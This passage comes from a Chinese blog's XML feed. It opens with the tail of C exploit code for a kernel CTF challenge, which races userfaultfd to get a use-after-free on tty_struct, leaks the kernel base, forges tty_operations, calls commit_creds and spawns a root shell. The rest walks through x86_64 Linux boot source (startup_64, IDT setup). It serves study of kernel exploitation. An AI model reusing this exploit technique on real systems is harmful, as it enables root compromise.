class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteRead</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> read(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> write(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">fixSizeByAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    sem_wait(&amp;evil_add_sem);<br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">constructUAF</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span><br>&#123;<br>    sem_wait(&amp;evil_edit_sem);<br>    noteEdit(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span>(note_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open device notebook!&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] register userfaultfd...&quot;</span>);<br><br>    <span class="hljs-type">pthread_t</span> uffd_monitor_thread;<br>    uffd_buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    register_userfaultfd_for_thread_stucking(&amp;uffd_monitor_thread, uffd_buf, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating tty_struct-size object...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, temp_page);<br>    noteEdit(<span class="hljs-number">0</span>, TTY_STRUCT_SIZE, temp_page);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] constructing UAF on tty_struct...&quot;</span>);<br><br>    <span class="hljs-type">pthread_t</span> add_fix_size_thread, edit_uaf_thread;<br>    pthread_create(&amp;edit_uaf_thread, <span class="hljs-literal">NULL</span>, constructUAF, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;add_fix_size_thread, <span class="hljs-literal">NULL</span>, fixSizeByAdd, <span class="hljs-literal">NULL</span>);<br><br>    sem_post(&amp;evil_edit_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    sem_post(&amp;evil_add_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel_base by tty_struct&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>    <span class="hljs-keyword">if</span>(fd_tty &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to open device ptmx!&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> tty_struct_data[<span class="hljs-number">0x2e0</span>];<br>    noteRead(<span class="hljs-number">0</span>, tty_struct_data);<br><br>    <span class="hljs-keyword">if</span>(*(<span class="hljs-type">int</span> *)tty_struct_data != <span class="hljs-number">0x5401</span>)<br>        err_exit(<span class="hljs-string">&quot;Fail to hit the tty_struct!&quot;</span>);<br><br>    <span class="hljs-type">size_t</span> tty_ops = tty_struct_data[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">if</span>((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTM_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>))<br>        kernel_offset = tty_ops - PTM_UNIX98_OPS;<br>    <span class="hljs-keyword">else</span><br>        kernel_offset = tty_ops - PTY_UNIX98_OPS;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base + kernel_offset);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct fake tty_operations...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>, temp_page);<br>    noteEdit(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), temp_page);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> <span class="hljs-title">fake_tty_ops</span>;</span><br>    fake_tty_ops.ioctl = kernel_offset + WORK_FOR_CPU_FN;<br>    noteWrite(<span class="hljs-number">1</span>, &amp;fake_tty_ops);<br><br>    <span class="hljs-type">size_t</span> fake_tty_ops_addr, fake_tty_struct_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> <span class="hljs-title">notebook</span>[0<span class="hljs-title">x10</span>];</span><br>    noteGift(notebook);<br>    fake_tty_ops_addr = (<span class="hljs-type">size_t</span>)notebook[<span class="hljs-number">1</span>].ptr;<br>    fake_tty_struct_addr = (<span class="hljs-type">size_t</span>)notebook[<span class="hljs-number">0</span>].ptr;<br><br>    <span class="hljs-type">size_t</span> fake_tty_struct_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(fd_tty, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    noteRead(<span class="hljs-number">0</span>, fake_tty_struct_data);<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = fake_tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">6</span>] = tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + COMMIT_CREDS;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(fd_tty, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    noteWrite(<span class="hljs-number">0</span>, tty_struct_data);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>Race Condition</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>source code</tag>
      
      <tag>userfaultfd</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernel源码分析-系统启动（二）</title>
    <link href="/2023/10/07/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2023/10/07/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>学userfaultfd→涉及mmap机制→为了mmap机制开始看linux内存管理系列源码解析→开始好奇类似于page结构体之类的东西是咋初始化的→继续研究系统启动</p><p>总结：万物的源头是系统启动doge（又在支线任务上越走越远了）</p><p>ps：还是主要关注内存相关的部分</p><span id="more"></span><p>内核版本4.15.8，x86_64</p><h1 id="startup-64（书接上回）"><a href="#startup-64（书接上回）" class="headerlink" title="startup_64（书接上回）"></a>startup_64（书接上回）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>1:<br>UNWIND_HINT_EMPTY<br><br>/* 检查CPU是否支持NX位（获得处理器信息） */<br>movl$0x80000001, %eax<br>cpuid<br>movl%edx,%edi<br><br>/* 把MSR_EFER（0xc0000080）放入ecx，然后执行rdmsr指令来读取CPU中的Model Specific Register（MSR） */<br>movl$MSR_EFER, %ecx<br>rdmsr<br>btsl$_EFER_SCE, %eax/* 启用syscall和sysret */<br>btl$20,%edi/* 不支持NX？ */<br>jnc     1f<br>btsl$_EFER_NX, %eax<br>btsq$_PAGE_BIT_NX,early_pmd_flags(%rip)<br>1:wrmsr/* 启用以上变化 */<br><br>/* 设置cr0 */<br>movl$CR0_STATE, %eax<br>movq%rax, %cr0<br><br>/* 建立启动阶段栈 */<br>movq initial_stack(%rip), %rsp<br><br>/* 清空eflags */<br>pushq $0<br>popfq<br><br>/* 更新全局描述符表 */<br>lgdtearly_gdt_descr(%rip)<br><br>/* 重新加载各个段 */<br>xorl %eax,%eax<br>movl %eax,%ds<br>movl %eax,%ss<br>movl %eax,%es<br>movl %eax,%fs<br>movl %eax,%gs<br><br>/* 设置一下gs寄存器，令它指向一个特殊的栈irqstack，用于处理中断 */<br>movl$MSR_GS_BASE,%ecx<br>movlinitial_gs(%rip),%eax<br>movlinitial_gs+4(%rip),%edx<br>wrmsr<br><br>movq%rsi, %rdi<br><br>.Ljump_to_C_code:<br>pushq$.Lafter_lret# put return address on stack for unwinder<br>xorq%rbp, %rbp# clear frame pointer<br>movqinitial_code(%rip), %rax# initial_code指向x86_64_start_kernel<br>pushq$__KERNEL_CS# set correct cs<br>pushq%rax# target address in negative space<br>lretq# 跳转至x86_64_start_kernel<br></code></pre></td></tr></table></figure><h2 id="initial-stack"><a href="#initial-stack" class="headerlink" title="initial_stack"></a>initial_stack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>GLOBAL(initial_stack)<br>.quad  init_thread_union + THREAD_SIZE - SIZEOF_PTREGS<br></code></pre></td></tr></table></figure><p>init_thread_union中thread_info在低地址（栈顶），以上的内存空间作为栈使用，预留了SIZEOF_PTREGS的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include\linux\sched.h</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">thread_union</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_THREAD_INFO_IN_TASK</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>[THREAD_SIZE/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)];<br>&#125;;<br><br><span class="hljs-comment">// include\linux\init_task.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __init_task_data __attribute__((__section__(<span class="hljs-string">&quot;.data..init_task&quot;</span>)))</span><br><br><span class="hljs-comment">// arch\ia64\include\asm\thread_info.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_THREAD_INFO(tsk)\</span><br><span class="hljs-meta">&#123;\</span><br><span class="hljs-meta">.task= &amp;tsk,\</span><br><span class="hljs-meta">.flags= 0,\</span><br><span class="hljs-meta">.cpu= 0,\</span><br><span class="hljs-meta">.addr_limit= KERNEL_DS,\</span><br><span class="hljs-meta">.preempt_count= INIT_PREEMPT_COUNT,\</span><br><span class="hljs-meta">&#125;</span><br><br><span class="hljs-comment">// init\init_task.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> <span class="hljs-title">init_task</span> =</span> INIT_TASK(init_task);<br>EXPORT_SYMBOL(init_task);<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">thread_union</span> <span class="hljs-title">init_thread_union</span> __<span class="hljs-title">init_task_data</span> =</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_THREAD_INFO_IN_TASK</span><br>INIT_THREAD_INFO(init_task)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="early-gdt-descr"><a href="#early-gdt-descr" class="headerlink" title="early_gdt_descr"></a>early_gdt_descr</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>.data<br>.align 16<br>.globl early_gdt_descr<br>early_gdt_descr:<br>.wordGDT_ENTRIES*8-1<br>early_gdt_descr_base:<br>.quadINIT_PER_CPU_VAR(gdt_page)<br></code></pre></td></tr></table></figure><p>虽然目前内核工作在用户空间的低地址中，但很快内核将会在它自己的内存地址空间中运行，所以要重新加载全局描述符表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GDT_ENTRIES16</span><br><br><span class="hljs-comment">// arch\x86\include\asm\desc.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gdt_page</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span> <span class="hljs-title">gdt</span>[<span class="hljs-title">GDT_ENTRIES</span>];</span><br>&#125; __attribute__((aligned(PAGE_SIZE)));<br><br><span class="hljs-comment">// arch\x86\include\asm\desc_defs.h</span><br><span class="hljs-comment">/* 8 byte segment descriptor */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span> &#123;</span><br>u16limit0;<br>u16base0;<br>u16base1: <span class="hljs-number">8</span>, type: <span class="hljs-number">4</span>, s: <span class="hljs-number">1</span>, dpl: <span class="hljs-number">2</span>, p: <span class="hljs-number">1</span>;<br>u16limit1: <span class="hljs-number">4</span>, avl: <span class="hljs-number">1</span>, l: <span class="hljs-number">1</span>, d: <span class="hljs-number">1</span>, g: <span class="hljs-number">1</span>, base2: <span class="hljs-number">8</span>;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure><h1 id="x86-64-start-kernel"><a href="#x86-64-start-kernel" class="headerlink" title="x86_64_start_kernel"></a>x86_64_start_kernel</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br>asmlinkage __visible <span class="hljs-type">void</span> __init <span class="hljs-title function_">x86_64_start_kernel</span><span class="hljs-params">(<span class="hljs-type">char</span> * real_mode_data)</span><br>&#123;<br><span class="hljs-comment">/* 一些检查 */</span><br>BUILD_BUG_ON(MODULES_VADDR &lt; __START_KERNEL_map);<br>BUILD_BUG_ON(MODULES_VADDR - __START_KERNEL_map &lt; KERNEL_IMAGE_SIZE);<br>BUILD_BUG_ON(MODULES_LEN + KERNEL_IMAGE_SIZE &gt; <span class="hljs-number">2</span>*PUD_SIZE);<br>BUILD_BUG_ON((__START_KERNEL_map &amp; ~PMD_MASK) != <span class="hljs-number">0</span>);<br>BUILD_BUG_ON((MODULES_VADDR &amp; ~PMD_MASK) != <span class="hljs-number">0</span>);<br>BUILD_BUG_ON(!(MODULES_VADDR &gt; __START_KERNEL));<br>BUILD_BUG_ON(!(((MODULES_END - <span class="hljs-number">1</span>) &amp; PGDIR_MASK) ==<br>(__START_KERNEL &amp; PGDIR_MASK)));<br>BUILD_BUG_ON(__fix_to_virt(__end_of_fixed_addresses) &lt;= MODULES_END);<br><br>    <span class="hljs-comment">/* 存储了每个CPU中cr4的Shadow Copy */</span><br>cr4_init_shadow();<br><br><span class="hljs-comment">/* 重置了所有的全局页目录项，同时向cr3中重新写入了的全局页目录表的地址 */</span><br>reset_early_page_tables();<br><br>    <span class="hljs-comment">/* 清空bss段 */</span><br>clear_bss();<br><br>    <span class="hljs-comment">/* 清空init_top_gpt页 */</span><br>clear_page(init_top_pgt);<br><br><span class="hljs-comment">/* sme和kasan初始化 */</span><br>sme_early_init();<br><br>kasan_early_init();<br><br>    <span class="hljs-comment">/* 初期中断和异常处理初始化 */</span><br>idt_setup_early_handler();<br><br>    <span class="hljs-comment">/* 处理boot_params */</span><br>copy_bootdata(__va(real_mode_data));<br><br>    <span class="hljs-comment">/* 加载处理器微代码 */</span><br>load_ucode_bsp();<br><br><span class="hljs-comment">/* 设置init_top_gpt */</span><br>init_top_pgt[<span class="hljs-number">511</span>] = early_top_pgt[<span class="hljs-number">511</span>];<br><br>x86_64_start_reservations(real_mode_data);<span class="hljs-comment">// 这个函数的最后调用了start_kernel</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>NEXT_PGD_PAGE(init_top_pgt)<br>.fill512,8,0<br>.fillPTI_USER_PGD_FILL,8,0<br></code></pre></td></tr></table></figure><h2 id="reset-early-page-tables"><a href="#reset-early-page-tables" class="headerlink" title="reset_early_page_tables"></a>reset_early_page_tables</h2><p>清空early_top_pgt，将early_top_pgt的物理地址写入cr3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __init <span class="hljs-title function_">reset_early_page_tables</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-built_in">memset</span>(early_top_pgt, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">pgd_t</span>)*(PTRS_PER_PGD<span class="hljs-number">-1</span>));<br>next_early_pgt = <span class="hljs-number">0</span>;<br>write_cr3(__sme_pa_nodebug(early_top_pgt));<br>&#125;<br></code></pre></td></tr></table></figure><p>其实就是把之前的物理地址的映射清空了，early_top_pgt的前511项都不使用，相关内容见系统启动（一）</p><h2 id="idt-setup-early-handler"><a href="#idt-setup-early-handler" class="headerlink" title="idt_setup_early_handler"></a>idt_setup_early_handler</h2><p>idt_setup_early_handler函数主要过程</p><ul><li>set_intr_gate函数设置每一个中断</li><li>load_idt加载中断</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">idt_setup_early_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NUM_EXCEPTION_VECTORS; i++)<br>set_intr_gate(i, early_idt_handler_array[i]);<br>load_idt(&amp;idt_descr);<br>&#125;<br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_ptr</span> <span class="hljs-title">idt_descr</span> __<span class="hljs-title">ro_after_init</span> =</span> &#123;<br>.size= (IDT_ENTRIES * <span class="hljs-number">2</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) - <span class="hljs-number">1</span>,<br>.address= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) idt_table,<br>&#125;;<br></code></pre></td></tr></table></figure><p>early_idt_handler_array是一个32x9的数组，每一项9字节，其中2个字节的备用指令用于向栈中压入默认错误码（如果异常本身没有提供错误码的话），2个字节的指令用于向栈中压入向量号，剩余5个字节用于跳转到异常处理程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM_EXCEPTION_VECTORS32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_IDT_HANDLER_SIZE 9</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> early_idt_handler_array[NUM_EXCEPTION_VECTORS][EARLY_IDT_HANDLER_SIZE];<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>ENTRY(early_idt_handler_array)<br>i = 0<br>.rept NUM_EXCEPTION_VECTORS<br>.if ((EXCEPTION_ERRCODE_MASK &gt;&gt; i) &amp; 1) == 0# 如果当前中断向量不需要错误码<br>UNWIND_HINT_IRET_REGS<br>pushq $0# 将一个值为0的64位数据压入栈中，这是为了在栈帧中保持统一的结构，即使当前中断向量不需要错误码<br>.else<br>UNWIND_HINT_IRET_REGS offset=8<br>.endif<br>pushq $i# 入栈中断向量号<br>jmp early_idt_handler_common# 跳转至同一异常处理程序<br>UNWIND_HINT_IRET_REGS<br>i = i + 1<br>.fill early_idt_handler_array + i*EARLY_IDT_HANDLER_SIZE - ., 1, 0xcc# 剩下的空间填充0xcc<br>.endr<br>UNWIND_HINT_IRET_REGS offset=16<br>END(early_idt_handler_array)<br></code></pre></td></tr></table></figure><p>最后长这样</p><p>set_intr_gate函数用一个idt_data结构体打包数据，然后传给idt_setup_from_table函数，同时把idt_table也传过去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\desc_defs.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span> &#123;</span><br>u16ist: <span class="hljs-number">3</span>,<br>zero: <span class="hljs-number">5</span>,<br>type: <span class="hljs-number">5</span>,<br>dpl: <span class="hljs-number">2</span>,<br>p: <span class="hljs-number">1</span>;<br>&#125; __attribute__((packed));<br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><span class="hljs-built_in">vector</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>segment;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span><span class="hljs-title">bits</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*addr;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_intr_gate</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> <span class="hljs-title">data</span>;</span><br><br>BUG_ON(n &gt; <span class="hljs-number">0xFF</span>);<br><br><span class="hljs-built_in">memset</span>(&amp;data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(data));<br>data.<span class="hljs-built_in">vector</span>= n;<br>data.addr= addr;<br>data.segment= __KERNEL_CS;<br>data.bits.type= GATE_INTERRUPT;<br>data.bits.p= <span class="hljs-number">1</span>;<br><br>idt_setup_from_table(idt_table, &amp;data, <span 